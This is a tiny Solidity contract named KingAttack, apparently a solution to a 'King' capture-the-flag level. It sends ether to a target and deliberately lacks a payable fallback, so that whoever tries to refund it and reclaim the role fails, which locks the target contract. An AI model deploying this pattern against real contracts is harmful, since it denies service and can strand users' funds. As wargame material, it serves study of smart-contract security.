pragma solidity ^0.4.18;


contract KingAttack {

  function doYourThing(address _target) public payable {
    if(!_target.call.value(msg.value)()) revert();
  }

  // OMG NO PAYABLE FALLBACK!!
}
